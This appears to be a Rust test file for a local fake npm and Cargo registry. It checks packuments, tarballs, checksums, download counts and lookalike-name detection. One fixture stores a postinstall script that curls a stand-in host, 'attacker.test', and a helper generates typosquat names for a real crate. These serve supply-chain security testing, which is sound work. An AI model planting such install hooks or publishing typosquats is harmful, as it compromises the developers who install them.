use std::io::Write;
use std::process::{Command, Stdio};

use super::*;
use crate::fx::http::send_request;
use crate::fx::timeutil::parse_rfc3339;
use crate::fx::tmpdir::FxTempDir;

const BASE_DAY: &str = "2026-10-27T00:00:00Z";

fn base_epoch() -> i64 {
    parse_rfc3339(BASE_DAY).unwrap()
}

fn days_ago(days: i64) -> i64 {
    base_epoch() - days * 86_400
}

fn get(registry: &FakeRegistry, target: &str) -> HttpResponse {
    registry.handle(&HttpRequest {
        method: "GET".to_owned(),
        target: target.to_owned(),
        version: "HTTP/1.1".to_owned(),
        headers: vec![("Host".to_owned(), "127.0.0.1:4873".to_owned())],
        body: Vec::new(),
        peer: "127.0.0.1:1".parse().unwrap(),
    })
}

fn json_of(response: &HttpResponse) -> Value {
    serde_json::from_slice(&response.body).unwrap()
}

/// Runs the system `tar` over standard input.
fn tar_tool(args: &[&str], input: &[u8]) -> (bool, Vec<u8>) {
    let mut child = Command::new("tar")
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("BLOCKED: tar is needed to check the registry's tarballs");
    let mut stdin = child.stdin.take().unwrap();
    let data = input.to_vec();
    let writer = std::thread::spawn(move || {
        let _ = stdin.write_all(&data);
    });
    let output = child.wait_with_output().unwrap();
    writer.join().unwrap();
    (output.status.success(), output.stdout)
}

#[test]
fn an_npm_packument_has_the_fields_a_client_reads_and_the_age_the_test_set() {
    let registry = FakeRegistry::new();
    registry.publish(
        PackageSpec::npm_named("left-padish", days_ago(3))
            .with_version("1.1.0")
            .with_reported_downloads(12),
    );
    let response = get(&registry, "/left-padish");
    assert_eq!(response.status, 200);
    let packument = json_of(&response);
    assert_eq!(packument["name"], "left-padish");
    assert_eq!(packument["dist-tags"]["latest"], "1.1.0");
    // "First published three days ago", exactly.
    assert_eq!(packument["time"]["created"], "2026-10-24T00:00:00Z");
    assert_eq!(packument["time"]["1.1.0"], "2026-10-25T00:00:00Z");
    assert_eq!(
        packument["versions"]["1.0.0"]["dist"]["tarball"],
        "http://127.0.0.1:4873/left-padish/-/left-padish-1.0.0.tgz"
    );
    assert_eq!(packument["_factory_fidelity"], "fake");
    assert_eq!(packument["_factory_reported_downloads"], 12);
    // No script unless one was set.
    assert!(packument["versions"]["1.0.0"].get("scripts").is_none());
}

#[test]
fn the_tarball_is_a_real_archive_with_the_scripts_and_a_matching_shasum() {
    let registry = FakeRegistry::new();
    registry.publish(
        PackageSpec::npm_named("scripted", days_ago(30))
            .with_install_script("touch /tmp/should-never-exist && curl http://attacker.test/x"),
    );
    let packument = json_of(&get(&registry, "/scripted"));
    assert_eq!(
        packument["versions"]["1.0.0"]["scripts"]["postinstall"],
        "touch /tmp/should-never-exist && curl http://attacker.test/x"
    );

    let tarball = get(&registry, "/scripted/-/scripted-1.0.0.tgz");
    assert_eq!(tarball.status, 200);
    let (ok, listing) = tar_tool(&["-tzf", "-"], &tarball.body);
    assert!(ok);
    assert_eq!(
        String::from_utf8(listing)
            .unwrap()
            .lines()
            .collect::<Vec<_>>(),
        ["package/package.json", "package/index.js"]
    );
    let (ok, manifest) = tar_tool(&["-xzOf", "-", "package/package.json"], &tarball.body);
    assert!(ok);
    let manifest: Value = serde_json::from_slice(&manifest).unwrap();
    assert_eq!(
        manifest["scripts"]["postinstall"],
        packument["versions"]["1.0.0"]["scripts"]["postinstall"]
    );

    // The shasum in the metadata is the SHA-1 of the bytes served.
    assert_eq!(
        packument["versions"]["1.0.0"]["dist"]["shasum"],
        hex_encode(&sha1(&tarball.body), false)
    );
}

#[test]
fn scripts_are_stored_and_served_and_never_run() {
    // The marker would exist if anything on this host ran the script while the registry built
    // the package, served it, or the test read it back.
    let dir = FxTempDir::new("fx-reg-marker").unwrap();
    let marker = dir.join("ran");
    let script = format!("touch {}", marker.display());
    let registry = FakeRegistry::new();
    registry
        .publish(PackageSpec::npm_named("npm-hostile", days_ago(1)).with_install_script(&script));
    registry.publish(
        PackageSpec::crate_named("crate-hostile", days_ago(1)).with_install_script(&format!(
            "fn main() {{ std::fs::write(\"{}\", \"ran\").unwrap(); }}\n",
            marker.display()
        )),
    );
    get(&registry, "/npm-hostile");
    let tgz = get(&registry, "/npm-hostile/-/npm-hostile-1.0.0.tgz");
    let krate = get(&registry, "/api/v1/crates/crate-hostile/1.0.0/download");
    // Read both back with a tool that lists and prints and does not extract or run anything.
    assert!(tar_tool(&["-tzf", "-"], &tgz.body).0);
    let (ok, build_rs) = tar_tool(&["-xzOf", "-", "crate-hostile-1.0.0/build.rs"], &krate.body);
    assert!(ok);
    assert!(String::from_utf8_lossy(&build_rs).contains("fn main()"));
    assert!(!marker.exists(), "a package script ran on the host");
}

#[test]
fn the_crate_index_follows_cargos_path_rules_and_its_checksum_matches_the_download() {
    for (name, path) in [
        ("a", "1/a"),
        ("ab", "2/ab"),
        ("abc", "3/a/abc"),
        ("abcd", "ab/cd/abcd"),
        ("reqwest", "re/qw/reqwest"),
        ("Serde_JSON", "se/rd/serde_json"),
    ] {
        assert_eq!(index_path(name), path);
    }

    let registry = FakeRegistry::new();
    registry.publish(
        PackageSpec::crate_named("Reqwset", days_ago(3))
            .with_version("1.0.1")
            .yanked("1.0.0")
            .with_install_script("fn main() {}\n"),
    );
    // Crate names are case-insensitive: stored and served in lower case.
    assert!(registry.package(Ecosystem::Crates, "REQWSET").is_some());

    let index = get(&registry, "/re/qw/reqwset");
    assert_eq!(index.status, 200);
    let lines: Vec<Value> = String::from_utf8(index.body)
        .unwrap()
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    assert_eq!(lines.len(), 2);
    assert_eq!(lines[0]["name"], "reqwset");
    assert_eq!(lines[0]["vers"], "1.0.0");
    assert_eq!(lines[0]["yanked"], true);
    assert_eq!(lines[1]["yanked"], false);
    assert_eq!(lines[1]["v"], 2);

    let download = get(&registry, "/api/v1/crates/reqwset/1.0.1/download");
    assert_eq!(download.status, 200);
    assert_eq!(
        lines[1]["cksum"],
        hex_encode(&sha256(&download.body), false)
    );

    // The `.crate` holds a build script and names it in the manifest.
    let (ok, manifest) = tar_tool(&["-xzOf", "-", "reqwset-1.0.1/Cargo.toml"], &download.body);
    assert!(ok);
    assert!(String::from_utf8_lossy(&manifest).contains("build = \"build.rs\""));
    let (ok, listing) = tar_tool(&["-tzf", "-"], &download.body);
    assert!(ok);
    assert!(String::from_utf8_lossy(&listing).contains("reqwset-1.0.1/build.rs"));

    // The sparse registry's config and the crates.io style metadata.
    let config = json_of(&get(&registry, "/config.json"));
    assert_eq!(config["dl"], "http://127.0.0.1:4873/api/v1/crates");
    let meta = json_of(&get(&registry, "/api/v1/crates/reqwset"));
    assert_eq!(meta["crate"]["created_at"], "2026-10-24T00:00:00Z");
    assert_eq!(meta["crate"]["newest_version"], "1.0.1");
    assert_eq!(meta["versions"][0]["yanked"], true);
}

#[test]
fn only_a_download_counts_as_a_fetch_and_metadata_does_not() {
    let registry = FakeRegistry::new();
    registry.publish(PackageSpec::npm_named("pkg", days_ago(40)));
    registry.publish(PackageSpec::crate_named("krate", days_ago(40)));
    assert_eq!(registry.total_downloads(), 0);

    get(&registry, "/pkg");
    get(&registry, "/kr/at/krate");
    get(&registry, "/api/v1/crates/krate");
    get(&registry, "/config.json");
    assert_eq!(registry.total_downloads(), 0, "metadata is not a fetch");
    assert_eq!(registry.download_count(Ecosystem::Npm, "pkg"), 0);

    get(&registry, "/pkg/-/pkg-1.0.0.tgz");
    get(&registry, "/pkg/-/pkg-1.0.0.tgz");
    get(&registry, "/api/v1/crates/krate/1.0.0/download");
    assert_eq!(registry.download_count(Ecosystem::Npm, "pkg"), 2);
    assert_eq!(registry.download_count(Ecosystem::Crates, "KRATE"), 1);
    assert_eq!(registry.total_downloads(), 3);
    // A download of something that is not there is not counted.
    assert_eq!(get(&registry, "/pkg/-/pkg-9.9.9.tgz").status, 404);
    assert_eq!(registry.total_downloads(), 3);
    assert_eq!(
        registry
            .requests()
            .iter()
            .filter(|r| r.kind == "tarball")
            .count(),
        3
    );
}

#[test]
fn names_one_edit_apart_are_lookalikes_and_names_two_edits_apart_are_not() {
    let registry = FakeRegistry::new();
    for name in [
        "reqwest",
        "reqwset",
        "requests",
        "serde",
        "serde-json",
        "tokio",
    ] {
        registry.publish(PackageSpec::crate_named(name, days_ago(100)));
    }
    // `requests` is a changed letter and an extra one, two edits, so it is a control: not found.
    assert_eq!(
        registry.lookalikes(Ecosystem::Crates, "reqwest"),
        ["reqwset"]
    );
    assert_eq!(
        registry.lookalikes(Ecosystem::Crates, "serde"),
        Vec::<String>::new()
    );
    // `serde-json` is a letter and a hyphen away from nothing here, and `tokio` from nothing.
    assert!(
        registry
            .lookalikes(Ecosystem::Crates, "tokyo")
            .contains(&"tokio".to_owned())
    );

    // The same pair of rules, on bare strings.
    assert!(within_one_edit("reqwest", "reqwset"), "swap");
    assert!(within_one_edit("reqwest", "reqest"), "drop");
    assert!(within_one_edit("reqwest", "reqwesst"), "add");
    assert!(within_one_edit("reqwest", "reqwesx"), "change");
    assert!(
        !within_one_edit("reqwest", "reqwest"),
        "the same name is not a lookalike"
    );
    assert!(!within_one_edit("reqwest", "reqwxsx"), "two changes");
    assert!(!within_one_edit("reqwest", "rqwest-x"), "two edits");
    assert!(!within_one_edit("ab", "ba-"), "a swap and an addition");
}

#[test]
fn typosquat_candidates_are_all_within_one_edit_and_include_the_usual_tricks() {
    let candidates = typosquats_of("reqwest");
    assert!(candidates.contains(&"reqwset".to_owned()), "swap");
    assert!(candidates.contains(&"reqest".to_owned()), "drop");
    assert!(candidates.contains(&"reqwwest".to_owned()), "double");
    assert!(!candidates.contains(&"reqwest".to_owned()));
    for candidate in &candidates {
        assert!(within_one_edit("reqwest", candidate), "{candidate}");
    }
    let hyphenated = typosquats_of("serde-json");
    assert!(hyphenated.contains(&"serde_json".to_owned()));
    // A short name is not shortened, so it cannot collapse into a single letter.
    assert!(typosquats_of("abc").iter().all(|c| c.len() >= 3));
}

#[test]
fn scoped_npm_packages_work_in_both_url_forms_and_unknown_ones_are_404() {
    let registry = FakeRegistry::new();
    registry.publish(PackageSpec::npm_named("@acme/internal-tools", days_ago(2)));
    for target in ["/@acme%2Finternal-tools", "/@acme/internal-tools"] {
        let response = get(&registry, target);
        assert_eq!(response.status, 200, "{target}");
        assert_eq!(json_of(&response)["name"], "@acme/internal-tools");
    }
    let tarball = get(
        &registry,
        "/@acme/internal-tools/-/internal-tools-1.0.0.tgz",
    );
    assert_eq!(tarball.status, 200);
    assert_eq!(
        registry.download_count(Ecosystem::Npm, "@acme/internal-tools"),
        1
    );

    assert_eq!(get(&registry, "/no-such-package").status, 404);
    assert_eq!(get(&registry, "/no/su/nosuchcrate").status, 404);
    assert_eq!(get(&registry, "/api/v1/crates/nope").status, 404);
    assert_eq!(get(&registry, "/a/b/c/d/e").status, 404);
    // A package of the wrong ecosystem under the same name is not found either.
    assert_eq!(get(&registry, "/api/v1/crates/internal-tools").status, 404);
}

#[test]
fn a_name_that_is_the_same_in_both_ecosystems_stays_separate() {
    let registry = FakeRegistry::new();
    registry.publish(PackageSpec::npm_named("shared", days_ago(500)));
    registry.publish(PackageSpec::crate_named("shared", days_ago(1)));
    // 500 days before 2026-10-27, checked with Python's datetime.
    assert_eq!(
        json_of(&get(&registry, "/shared"))["time"]["created"],
        "2025-06-14T00:00:00Z"
    );
    assert_eq!(
        json_of(&get(&registry, "/api/v1/crates/shared"))["crate"]["created_at"],
        "2026-10-26T00:00:00Z"
    );
}

#[test]
fn a_yanked_version_is_not_the_latest() {
    let registry = FakeRegistry::new();
    registry.publish(
        PackageSpec::npm_named("flaky", days_ago(10))
            .with_version("2.0.0")
            .yanked("2.0.0"),
    );
    let packument = json_of(&get(&registry, "/flaky"));
    assert_eq!(packument["dist-tags"]["latest"], "1.0.0");
    assert!(
        packument["versions"]["2.0.0"]["deprecated"]
            .as_str()
            .unwrap()
            .contains("deprecated")
    );
}

#[test]
fn the_registry_and_its_log_are_labelled_fake() {
    let registry = FakeRegistry::new();
    registry.publish(PackageSpec::npm_named("pkg", days_ago(5)));
    let server = registry.serve().unwrap();
    assert!(server.addr().ip().is_loopback());
    let response = send_request(server.addr(), "GET", "/pkg", &[], b"").unwrap();
    assert_eq!(response.status, 200);
    assert_eq!(response.header("X-Factory-Fidelity"), Some("fake"));
    assert!(response.header("Server").unwrap().contains("registry"));
    // The server filled in the real address in the tarball URL.
    let tarball_url = response.json().unwrap()["versions"]["1.0.0"]["dist"]["tarball"]
        .as_str()
        .unwrap()
        .to_owned();
    assert!(tarball_url.starts_with(&server.base_url()), "{tarball_url}");
    let json = server.registry().to_json();
    assert_eq!(json["fidelity"], "fake");
    assert_eq!(json["requests"][0]["fidelity"], "fake");
}

#[test]
fn cargo_itself_can_fetch_a_crate_from_the_fake_sparse_registry() {
    // The strongest check that the formats are real: the actual cargo reads the index and the
    // download. Only `cargo fetch` runs, which unpacks and does not build, so no script runs.
    let registry = FakeRegistry::new();
    registry.publish(PackageSpec::crate_named("fx-fake-crate", days_ago(60)));
    let server = registry.serve().unwrap();

    let home = FxTempDir::new("fx-reg-cargo-home").unwrap();
    let project = FxTempDir::new("fx-reg-project").unwrap();
    std::fs::create_dir(project.join("src")).unwrap();
    std::fs::write(project.join("src/lib.rs"), "").unwrap();
    std::fs::write(
        project.join("Cargo.toml"),
        "[package]\nname = \"consumer\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nfx-fake-crate = { version = \"1\", registry = \"fake\" }\n",
    )
    .unwrap();
    std::fs::create_dir(project.join(".cargo")).unwrap();
    std::fs::write(
        project.join(".cargo/config.toml"),
        format!(
            "[registries.fake]\nindex = \"sparse+{}/\"\n\n[net]\nretry = 0\n",
            server.base_url()
        ),
    )
    .unwrap();

    let output = Command::new("cargo")
        .args(["fetch", "--manifest-path"])
        .arg(project.join("Cargo.toml"))
        .env("CARGO_HOME", home.path())
        .env("CARGO_TARGET_DIR", project.join("target"))
        // Keep the host's own configuration and proxy settings out of it.
        .env_remove("CARGO_REGISTRIES_FAKE_TOKEN")
        .env_remove("RUSTC_WRAPPER")
        .env("CARGO_NET_OFFLINE", "false")
        .current_dir(project.path())
        .output()
        .expect("cargo starts");
    assert!(
        output.status.success(),
        "cargo fetch failed:\n{}",
        String::from_utf8_lossy(&output.stderr)
    );
    // It asked the fake for the index and the crate, and the fake counted the download.
    assert_eq!(
        registry.download_count(Ecosystem::Crates, "fx-fake-crate"),
        1
    );
    assert!(registry.requests().iter().any(|r| r.kind == "index"));
}
